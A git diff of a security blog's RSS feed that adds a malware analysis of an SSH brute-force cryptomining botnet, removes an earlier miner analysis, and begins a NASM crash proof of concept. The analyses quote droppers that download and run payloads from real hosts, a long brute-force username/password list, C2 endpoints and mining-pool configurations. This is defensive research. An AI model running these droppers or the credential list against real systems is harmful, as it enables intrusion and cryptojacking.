@@ -3,10 +3,10 @@
   <channel>
     <title></title>
     <description>Blog</description>
-    <link>http://localhost:4000/</link>
-    <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml"/>
-    <pubDate>Mon, 03 Dec 2018 01:40:23 +0800</pubDate>
-    <lastBuildDate>Mon, 03 Dec 2018 01:40:23 +0800</lastBuildDate>
+    <link>https://fakhrizulkifli.github.io/</link>
+    <atom:link href="https://fakhrizulkifli.github.io/feed.xml" rel="self" type="application/rss+xml"/>
+    <pubDate>Wed, 05 Dec 2018 13:14:22 +0800</pubDate>
+    <lastBuildDate>Wed, 05 Dec 2018 13:14:22 +0800</lastBuildDate>
     <generator>Jekyll v3.8.5</generator>
     
       <item>
@@ -103,200 +103,8 @@ support
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 </description>
         <pubDate>Sun, 02 Dec 2018 00:00:00 +0800</pubDate>
-        <link>http://localhost:4000/2018/b08f9dc5784532be5b3f695f37c7781b/</link>
-        <guid isPermaLink="true">http://localhost:4000/2018/b08f9dc5784532be5b3f695f37c7781b/</guid>
-        
-        
-      </item>
-    
-      <item>
-        <title>4ec4f1ec6a030c4969bd336258f6699e</title>
-        <description>&lt;p&gt;Initial file dropped was a Bash file containing following commands:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;rm&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; /var/tmp/.sys.log
-curl http://www.bizqsoft.com/imgtemplate/11.png &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; /var/tmp/.sys.log &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; wget http://www.bizqsoft.com/imgtemplate/11.png &lt;span class=&quot;nt&quot;&gt;-O&lt;/span&gt; /var/tmp/.sys.log
-&lt;span class=&quot;nb&quot;&gt;chmod &lt;/span&gt;0777 /var/tmp/.sys.log
-/var/tmp/.sys.log
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;File &lt;code class=&quot;highlighter-rouge&quot;&gt;11.png&lt;/code&gt; was found packed using UPX packer. After the decompression, a list of websites has been found which is potentially has been compromised and used to host the loader for the bot.&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[
-    &quot;http://www.ltj4949.com/weixin/loader.gif&quot;,
-    &quot;http://128.1.49.78/phpmyadmin/loader.gif&quot;,
-    &quot;http://111.231.230.124/data/loader.gif&quot;,
-    &quot;http://124.42.117.172/yjcm/loader.gif&quot;,
-    &quot;http://180.76.114.216/log/loader.gif&quot;,
-    &quot;http://103.17.95.45/log/loader.gif&quot;,
-    &quot;http://car.earthstudio.cn/static/img/loader.gif&quot;,
-    &quot;http://111.231.239.187/loader/loader.gif&quot;,
-    &quot;http://120.27.33.177:80/phpMyAdmin/locale/loader.gif&quot;,
-    &quot;http://120.55.53.187:80/website/e/data/loader.gif&quot;,
-    &quot;http://47.100.24.187:80/Mobile/data/loader.gif&quot;,
-    &quot;http://117.48.211.158:80/phpMyAdmin/locale/loader.gif&quot;,
-    &quot;http://47.97.217.130:80/heart_health/vendor/loader.gif&quot;,
-    &quot;http://132.148.151.76:80/phpMyAdmin/locale/loader.gif&quot;,
-    &quot;http://39.109.113.71/phpmyadmin/setup/loader.gif&quot;
-]
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Further analysis shows that a miner is being fetched from any live domain from the list.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;GET /posp_test/uploads/x86.png HTTP/1.1
-Host: 118.25.102.126
-Accept: &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;/&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;
-User-Agent: Mozilla/5.0 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Windows&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; U&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; Windows NT 6.0&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; en-US&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; rv:1.8.1.7&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; Gecko/20070914 Firefox/2.0.0.7
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;XMRig miner credentials&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;{
-    &quot;id&quot;: 1,
-    &quot;jsonrpc&quot;: &quot;2.0&quot;,
-    &quot;method&quot;: &quot;login&quot;,
-    &quot;params&quot;: {
-        &quot;agent&quot;: &quot;XMRig/2.6.4 (Linux i686) libuv/1.19.3-dev gcc/7.2.0&quot;,
-        &quot;algo&quot;: [
-            &quot;cn/1&quot;,
-            &quot;cn/0&quot;,
-            &quot;cn/xtl&quot;,
-            &quot;cn/msr&quot;,
-            &quot;cn/xao&quot;,
-            &quot;cn/rto&quot;,
-            &quot;cn&quot;
-        ],
-        &quot;login&quot;: &quot;4ACoKdxrH8QeqdY16p9djYF1C4CbX7FB34ECdJxw8CmLTS8DurirbQehgGUdQkLz1gP93ZH57iN6444NkCNW9w9i2UZkYqY&quot;,
-        &quot;pass&quot;: &quot;x&quot;
-    }
-}
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Below is the list of mining server being use by the miner:&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;{
-    &quot;algo&quot;: &quot;cryptonight&quot;,
-    &quot;api&quot;: {
-        &quot;port&quot;: 0,
-        &quot;access-token&quot;: null,
-        &quot;worker-id&quot;: null,
-        &quot;ipv6&quot;: false,
-        &quot;restricted&quot;: true
-    },
-    &quot;av&quot;: 0,
-    &quot;background&quot;: false,
-    &quot;colors&quot;: true,
-    &quot;cpu-affinity&quot;: null,
-    &quot;cpu-priority&quot;: null,
-    &quot;donate-level&quot;: 1,
-    &quot;huge-pages&quot;: true,
-    &quot;hw-aes&quot;: null,
-    &quot;log-file&quot;: null,
-    &quot;max-cpu-usage&quot;: 75,
-    &quot;pools&quot;: [
-        {
-            &quot;url&quot;: &quot;sg.minexmr.com:4444&quot;,
-            &quot;user&quot;: &quot;4ACoKdxrH8QeqdY16p9djYF1C4CbX7FB34ECdJxw8CmLTS8DurirbQehgGUdQkLz1gP93ZH57iN6444NkCNW9w9i2UZkYqY&quot;,
-            &quot;pass&quot;: &quot;x&quot;,
-            &quot;rig-id&quot;: null,
-            &quot;nicehash&quot;: false,
-            &quot;keepalive&quot;: false,
-            &quot;variant&quot;: 1
-        },
-        {
-            &quot;url&quot;: &quot;sg.minexmr.com:80&quot;,
-            &quot;user&quot;: &quot;4ACoKdxrH8QeqdY16p9djYF1C4CbX7FB34ECdJxw8CmLTS8DurirbQehgGUdQkLz1gP93ZH57iN6444NkCNW9w9i2UZkYqY&quot;,
-            &quot;pass&quot;: &quot;x&quot;,
-            &quot;rig-id&quot;: null,
-            &quot;nicehash&quot;: false,
-            &quot;keepalive&quot;: false,
-            &quot;variant&quot;: 1
-        },
-        {
-            &quot;url&quot;: &quot;sg.minexmr.com:443&quot;,
-            &quot;user&quot;: &quot;4ACoKdxrH8QeqdY16p9djYF1C4CbX7FB34ECdJxw8CmLTS8DurirbQehgGUdQkLz1gP93ZH57iN6444NkCNW9w9i2UZkYqY&quot;,
-            &quot;pass&quot;: &quot;x&quot;,
-            &quot;rig-id&quot;: null,
-            &quot;nicehash&quot;: false,
-            &quot;keepalive&quot;: false,
-            &quot;variant&quot;: 1
-        },
-        {
-            &quot;url&quot;: &quot;pool.minexmr.com:4444&quot;,
-            &quot;user&quot;: &quot;4ACoKdxrH8QeqdY16p9djYF1C4CbX7FB34ECdJxw8CmLTS8DurirbQehgGUdQkLz1gP93ZH57iN6444NkCNW9w9i2UZkYqY&quot;,
-            &quot;pass&quot;: &quot;x&quot;,
-            &quot;rig-id&quot;: null,
-            &quot;nicehash&quot;: false,
-            &quot;keepalive&quot;: false,
-            &quot;variant&quot;: 1
-        },
-        {
-            &quot;url&quot;: &quot;pool.minexmr.com:80&quot;,
-            &quot;user&quot;: &quot;4ACoKdxrH8QeqdY16p9djYF1C4CbX7FB34ECdJxw8CmLTS8DurirbQehgGUdQkLz1gP93ZH57iN6444NkCNW9w9i2UZkYqY&quot;,
-            &quot;pass&quot;: &quot;x&quot;,
-            &quot;rig-id&quot;: null,
-            &quot;nicehash&quot;: false,
-            &quot;keepalive&quot;: false,
-            &quot;variant&quot;: 1
-        },
-        {
-            &quot;url&quot;: &quot;pool.minexmr.com:443&quot;,
-            &quot;user&quot;: &quot;4ACoKdxrH8QeqdY16p9djYF1C4CbX7FB34ECdJxw8CmLTS8DurirbQehgGUdQkLz1gP93ZH57iN6444NkCNW9w9i2UZkYqY&quot;,
-            &quot;pass&quot;: &quot;x&quot;,
-            &quot;rig-id&quot;: null,
-            &quot;nicehash&quot;: false,
-            &quot;keepalive&quot;: false,
-            &quot;variant&quot;: 1
-        },
-        {
-            &quot;url&quot;: &quot;xmr-usa.dwarfpool.com:8005 &quot;,
-            &quot;user&quot;: &quot;4ACoKdxrH8QeqdY16p9djYF1C4CbX7FB34ECdJxw8CmLTS8DurirbQehgGUdQkLz1gP93ZH57iN6444NkCNW9w9i2UZkYqY&quot;,
-            &quot;pass&quot;: &quot;x&quot;,
-            &quot;rig-id&quot;: null,
-            &quot;nicehash&quot;: false,
-            &quot;keepalive&quot;: false,
-            &quot;variant&quot;: 1
-        },
-        {
-            &quot;url&quot;: &quot;xmr-usa.dwarfpool.com:8080&quot;,
-            &quot;user&quot;: &quot;4ACoKdxrH8QeqdY16p9djYF1C4CbX7FB34ECdJxw8CmLTS8DurirbQehgGUdQkLz1gP93ZH57iN6444NkCNW9w9i2UZkYqY&quot;,
-            &quot;pass&quot;: &quot;x&quot;,
-            &quot;rig-id&quot;: null,
-            &quot;nicehash&quot;: false,
-            &quot;keepalive&quot;: false,
-            &quot;variant&quot;: 1
-        },
-        {
-            &quot;url&quot;: &quot;pool.monero.hashvault.pro:443&quot;,
-            &quot;user&quot;: &quot;4ACoKdxrH8QeqdY16p9djYF1C4CbX7FB34ECdJxw8CmLTS8DurirbQehgGUdQkLz1gP93ZH57iN6444NkCNW9w9i2UZkYqY&quot;,
-            &quot;pass&quot;: &quot;x&quot;,
-            &quot;rig-id&quot;: null,
-            &quot;nicehash&quot;: false,
-            &quot;keepalive&quot;: false,
-            &quot;variant&quot;: 1
-        },
-        {
-            &quot;url&quot;: &quot;pool.monero.hashvault.pro:443&quot;,
-            &quot;user&quot;: &quot;4ACoKdxrH8QeqdY16p9djYF1C4CbX7FB34ECdJxw8CmLTS8DurirbQehgGUdQkLz1gP93ZH57iN6444NkCNW9w9i2UZkYqY&quot;,
-            &quot;pass&quot;: &quot;x&quot;,
-            &quot;rig-id&quot;: null,
-            &quot;nicehash&quot;: false,
-            &quot;keepalive&quot;: false,
-            &quot;variant&quot;: 1
-        }
-    ],
-    &quot;print-time&quot;: 600,
-    &quot;retries&quot;: 3,
-    &quot;retry-pause&quot;: 3,
-    &quot;safe&quot;: false,
-    &quot;threads&quot;: null,
-    &quot;user-agent&quot;: null,
-    &quot;watch&quot;: false
-}
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-</description>
-        <pubDate>Sun, 02 Dec 2018 00:00:00 +0800</pubDate>
-        <link>http://localhost:4000/2018/4ec4f1ec6a030c4969bd336258f6699e/</link>
-        <guid isPermaLink="true">http://localhost:4000/2018/4ec4f1ec6a030c4969bd336258f6699e/</guid>
+        <link>https://fakhrizulkifli.github.io/2018/b08f9dc5784532be5b3f695f37c7781b/</link>
+        <guid isPermaLink="true">https://fakhrizulkifli.github.io/2018/b08f9dc5784532be5b3f695f37c7781b/</guid>
         
         
       </item>
@@ -359,8 +167,529 @@ User-Agent: Mozilla/5.0 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Windows&lt
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 </description>
         <pubDate>Sun, 02 Dec 2018 00:00:00 +0800</pubDate>
-        <link>http://localhost:4000/2018/3945ac76b591cdbd50515b9f65821a64/</link>
-        <guid isPermaLink="true">http://localhost:4000/2018/3945ac76b591cdbd50515b9f65821a64/</guid>
+        <link>https://fakhrizulkifli.github.io/2018/3945ac76b591cdbd50515b9f65821a64/</link>
+        <guid isPermaLink="true">https://fakhrizulkifli.github.io/2018/3945ac76b591cdbd50515b9f65821a64/</guid>
+        
+        
+      </item>
+    
+      <item>
+        <title>03cc8d5deeb63e30f5a5d945abf99b00</title>
+        <description>&lt;p&gt;Initial file dropped via Bash script:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#!/bin/bash&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; ~/
+&lt;span class=&quot;nb&quot;&gt;mkdir&lt;/span&gt; .nano
+&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; ~/.nano/
+curl &lt;span class=&quot;nt&quot;&gt;-O&lt;/span&gt; http://bookaires.com/feed/remote/nano.sh
+&lt;span class=&quot;nb&quot;&gt;chmod&lt;/span&gt; +x nano.sh
+./nano.sh
+&lt;span class=&quot;nb&quot;&gt;rm&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-rf&lt;/span&gt; /var/tmp/...
+&lt;span class=&quot;nb&quot;&gt;rm&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-rf&lt;/span&gt; /var/tmp/.bin/
+&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /var/tmp
+curl &lt;span class=&quot;nt&quot;&gt;-O&lt;/span&gt; http://bookaires.com/feed/monero.tgz
+&lt;span class=&quot;nb&quot;&gt;tar &lt;/span&gt;xvf monero.tgz
+&lt;span class=&quot;nb&quot;&gt;rm&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-rf&lt;/span&gt; monero.tgz
+&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /var/tmp/.bin/
+&lt;span class=&quot;nb&quot;&gt;chmod&lt;/span&gt; +x &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;nohup&lt;/span&gt; ./start &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; /dev/null &amp;amp;
+&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /tmp
+&lt;span class=&quot;nb&quot;&gt;mkdir&lt;/span&gt; .vd
+&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /tmp/.vd/
+curl &lt;span class=&quot;nt&quot;&gt;-O&lt;/span&gt; http://bookaires.com/feed/sslm.tgz
+&lt;span class=&quot;nb&quot;&gt;tar &lt;/span&gt;zxvf sslm.tgz
+&lt;span class=&quot;nb&quot;&gt;rm&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-rf&lt;/span&gt; sslm.tgz
+&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /tmp/.vd/.sslm
+./sparky.sh 192.168 &amp;amp;
+./rand &amp;amp;
+&lt;span class=&quot;nb&quot;&gt;rm&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-rf&lt;/span&gt; /tmp/min.sh
+&lt;span class=&quot;nb&quot;&gt;touch&lt;/span&gt; /tmp/hello
+&lt;span class=&quot;nb&quot;&gt;exit &lt;/span&gt;0
+&lt;span class=&quot;nb&quot;&gt;exit
+&lt;/span&gt;pkill &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; bash
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;List of files contained in the &lt;code class=&quot;highlighter-rouge&quot;&gt;sslm.tgz&lt;/code&gt;&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;drwxr-xr-x  0 asoftdoc asoftdoc    0 Aug 26 08:25 .sslm/
+-rwxr-xr-x  0 asoftdoc asoftdoc  764 Aug 24 04:37 .sslm/rx
+-rwxrwxr-x  0 asoftdoc asoftdoc  892 Aug 26 09:08 .sslm/sparky.sh
+drwxr-xr-x  0 asoftdoc asoftdoc    0 Aug 26 09:07 .sslm/tsm/
+-rwxrwxr-x  0 asoftdoc asoftdoc  861 Aug 26 07:33 .sslm/tsm/a
+-rwxr-xr-x  0 asoftdoc asoftdoc  170 Aug 26 07:23 .sslm/tsm/rd
+-rwxr-xr-x  0 asoftdoc asoftdoc 1014456 Dec  7  2017 .sslm/tsm/tsm
+-rwxrwxr-x  0 asoftdoc asoftdoc     368 Aug 26 06:43 .sslm/tsm/bclass.pl
+-rwxrwxr-x  0 asoftdoc asoftdoc      54 Aug 26 08:25 .sslm/tsm/start
+-rwxrwxr-x  0 asoftdoc asoftdoc 1040592 Feb  9  2017 .sslm/haiduc
+-rwxrwxr-x  0 asoftdoc asoftdoc      65 Aug 26 08:27 .sslm/start
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;tsm&lt;/code&gt; is a SSH service brute force binary known as “TSM - The SSH Machine is your machine by Igor Klopov”.&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;haiduc&lt;/code&gt; is a 64-bit ELF binary which is used to brute force, enumerate vulnerable hosts, and execute the initial dropper.&lt;/p&gt;
+
+&lt;p&gt;List of usernames and passwords:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nginx nginx
+oracle oracle
+oracle oracle123
+developer developer
+postgres postgres
+postgres 123456
+deploy deploy
+mysql mysql
+mysql 123456
+minecraft minecraft
+minecraft 123456
+admin qwe123
+admin 123qwe
+oracle 1234
+oracle 123456
+oracle password
+root admin
+root rootroot
+root root1
+root abc@1234
+root root12
+root root123
+root root1234
+root admin123
+root admin1234
+root abc123
+root 123abc
+root password
+root P@ssw0rd
+root Q1w2e3r4
+root !QAZ2wsx
+root pass123
+root pass@123
+root pass1234
+root pass@1234
+root live
+root root
+root 1234
+root 123456
+root 12345678
+user user
+user 1234
+user 123456
+user password
+user live
+user user123
+user 12345
+user 123123
+pi raspberry
+ubuntu ubuntu
+ubuntu password
+ubuntu 1234
+ubuntu 12345
+ubuntu 123456
+ubuntu ubuntu123
+ubuntu qwerty
+ubnt ubnt
+ubnt password
+ubnt 1234
+ubnt 12345
+ubnt 123456
+ubnt ubnt123
+ubnt qwerty
+test test
+postgres posgres
+postgres password
+postgres 1234
+admin admin
+admin password
+admin 1234
+admin 123456
+guest guest
+guest password
+guest 1234
+guest 123456
+jenkins jenkins
+jenkins password
+jenkins jenkinspass
+jenkins 1234
+jenkins 123456
+hadoop hadoop
+hadoop password
+hadoop 1234
+hadoop 123456
+nagios nagios
+nagios password
+nagios 1234
+nagios 123456
+dev dev
+zabbix zabbix
+zabbix 1234
+zabbix 123456
+zabbix P@ssw0rd
+zabbix admin
+zabbix zabbix123
+zabbix zabbix1234
+zabbix password
+student student
+student student123
+ts1 ts1
+ts1 123456
+ts1 12345
+ts1 qwerty
+miner miner
+miner miner123
+miner 123456
+miner 12345
+miner 123123
+miner qwerty
+dev dev123
+dev 123123
+dev 123456
+dev qwerty
+developer developer123
+developer 123456
+developer 12345
+developer 123123
+nobody nobody
+admin qwerty
+admin admin123
+test2 test2
+patrick patrick
+julio julio
+usuario usuario
+utilizador utilizador
+utilisateur utilisateur
+administrator administrator
+administrador administrador
+administrateur administrateur
+teste teste
+tester tester
+prueba prueba
+pruebas pruebas
+testing testing
+hospede hospede
+visitor visitor
+visitante visitante
+visiteur visiteur
+kubuntu kubuntu
+lubuntu lubuntu
+xubuntu xubuntu
+lxde lxde
+superadmin superadmin
+superuser superuser
+developpeur developpeur
+deployer deployer
+support support
+suporte suporte
+soporte soporte
+etudiant etudiant
+estudante estudante
+estudiante estudiante
+teacher teacher
+prof prof
+professeur professeur
+professor professor
+profesor profesor
+server server
+serveur serveur
+servidor servidor
+amazon amazon
+csgoserver csgoserver
+dotaserver dotaserver
+wot wot
+wotserver wotserver
+username username
+ts ts
+test1 test1
+ts2 ts2
+usuario 123456
+utilizador 123456
+utilisateur 123456
+administrator 123456
+administrador 123456
+administrateur 123456
+test 123456
+teste 123456
+tester 123456
+prueba 123456
+pruebas 123456
+testing 123456
+hospede 123456
+visitor 123456
+visitante 123456
+visiteur 123456
+kubuntu 123456
+lubuntu 123456
+xubuntu 123456
+lxde 123456
+superadmin 123456
+superuser 123456
+developpeur 123456
+deploy 123456
+deployer 123456
+support 123456
+suporte 123456
+soporte 123456
+student 123456
+etudiant 123456
+estudante 123456
+estudiante 123456
+teacher 123456
+prof 123456
+professeur 123456
+professor 123456
+profesor 123456
+server 123456
+serveur 123456
+servidor 123456
+amazon 123456
+nobody 123456
+csgoserver 123456
+dotaserver 123456
+wot 123456
+wotserver 123456
+username 123456
+ts 123456
+test1 123456
+test2 123456
+ts2 123456
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;rx&lt;/code&gt; is a bash shell script used to get the information such as the brute force password list and target IP classes from the domain name &lt;code class=&quot;highlighter-rouge&quot;&gt;bookaires.com&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;Information hosted on &lt;code class=&quot;highlighter-rouge&quot;&gt;bookaires.com&lt;/code&gt;:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bookaires[.]com/feed/feedp.php - password list
+bookaires[.]com/feed/class.php - IP classes
+bookaires[.]com/info.php - C2 endpoint for retrieving information from the victim
+bookaires[.]com/feed/min.sh - Binary dropper script
+bookaires[.]com/feed/remote/rinfo.php - C2 endpoint for registering new deployed miner
+bookaires[.]com/feed/ips.php - List of target IP addresses
+bookaires[.]com/feed/feedonep.php - Feed one random username and password
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;List of files contained in &lt;code class=&quot;highlighter-rouge&quot;&gt;monero.tgz&lt;/code&gt;:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;drwxr-xr-x  0 postgres postgres    0 Aug 27 06:32 .bin/
+-rwxrwxr-x  0 postgres postgres  166 Aug 27 06:31 .bin/start
+-rwxrwxr-x  0 postgres postgres 1196 Aug 27 06:29 .bin/.run
+-rwxrwxr-x  0 postgres postgres  511 Aug 27 06:24 .bin/.crondsh
+-rwxrwxr-x  0 postgres postgres  773 Aug 27 06:05 .bin/.config.json
+-rwxr-xr-x  0 postgres postgres 2731128 Apr 27 06:10 .bin/.cnrig
+-rwxr-xr-x  0 postgres postgres  838583 Apr  1  2017 .bin/.h64
+-rwxrwxr-x  0 postgres postgres     773 Aug 27 06:05 .bin/.config.json.big
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;The miner &lt;code class=&quot;highlighter-rouge&quot;&gt;cnrig&lt;/code&gt; used is compiled on April 27 2018, version 0.1.5. The binary is renamed to &lt;code class=&quot;highlighter-rouge&quot;&gt;sshd&lt;/code&gt; just before the execution.&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;h64&lt;/code&gt; is a binary known as “XHide - Process Faker, by Schizoprenic Xnuxer Research (c) 2002”&lt;/p&gt;
+
+&lt;p&gt;Mining server credentials:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;{
+    &quot;algo&quot;: &quot;cryptonight&quot;,
+    &quot;api&quot;: {
+        &quot;port&quot;: 0,
+        &quot;access-token&quot;: null,
+        &quot;worker-id&quot;: null,
+        &quot;ipv6&quot;: false,
+        &quot;restricted&quot;: true
+    },
+    &quot;av&quot;: 0,
+    &quot;background&quot;: true,
+    &quot;colors&quot;: true,
+    &quot;cpu-priority&quot;: 0,
+    &quot;donate-level&quot;: 1,
+    &quot;log-file&quot;: null,
+    &quot;max-cpu-usage&quot;: 90,
+    &quot;pools&quot;: [
+        {
+            &quot;url&quot;: &quot;pool.supportxmr.com:5555&quot;,
+            &quot;user&quot;: &quot;42hhyPKkombM6LYEsz6kZe3d1ktHpkkD54Rtv5VZohaAbQAXzmAjkHSDZVWqMm9ieRCjMkijBYhy39ZJrYWVxKDVVqtzwPf&quot;,
+            &quot;pass&quot;: &quot;workx&quot;,
+            &quot;keepalive&quot;: true,
+            &quot;nicehash&quot;: false,
+            &quot;variant&quot;: 1
+        }
+    ],
+    &quot;print-time&quot;: 60,
+    &quot;retries&quot;: 5,
+    &quot;retry-pause&quot;: 5,
+    &quot;safe&quot;: false,
+    &quot;syslog&quot;: false,
+    &quot;threads&quot;: null
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+</description>
+        <pubDate>Sun, 02 Dec 2018 00:00:00 +0800</pubDate>
+        <link>https://fakhrizulkifli.github.io/2018/03cc8d5deeb63e30f5a5d945abf99b00/</link>
+        <guid isPermaLink="true">https://fakhrizulkifli.github.io/2018/03cc8d5deeb63e30f5a5d945abf99b00/</guid>
+        
+        
+      </item>
+    
+      <item>
+        <title>Netwide Assembler (NASM) 2.14rc15 NULL Pointer Dereference (PoC)</title>
+        <description>&lt;p&gt;The bug is pretty much straightforward and can be triggered with a single line of assembly instruction.&lt;/p&gt;
+
+&lt;p&gt;Credit goes to &lt;a href=&quot;https://twitter.com/zeifan&quot;&gt;@zeifan&lt;/a&gt; for discovering this vulnerability by using the AFL fuzzer.&lt;/p&gt;
+
+&lt;h1 id=&quot;proof-of-crash&quot;&gt;Proof-of-Crash&lt;/h1&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1. echo &quot;equ   push  rax&quot; &amp;gt; poc
+2. nasm -f elf poc
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;typedef&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;insn&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;cm&quot;&gt;/* an instruction itself */&lt;/span&gt;
+    &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt;            &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;label&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;                 &lt;span class=&quot;cm&quot;&gt;/* the label defined, or NULL */&lt;/span&gt;
+    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;             &lt;span class=&quot;n&quot;&gt;prefixes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;MAXPREFIX&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;    &lt;span class=&quot;cm&quot;&gt;/* instruction prefixes, if any */&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;enum&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;opcode&lt;/span&gt;     &lt;span class=&quot;n&quot;&gt;opcode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;                 &lt;span class=&quot;cm&quot;&gt;/* the opcode - not just the string */&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;enum&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ccode&lt;/span&gt;      &lt;span class=&quot;n&quot;&gt;condition&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;              &lt;span class=&quot;cm&quot;&gt;/* the condition code, if Jcc/SETcc */&lt;/span&gt;
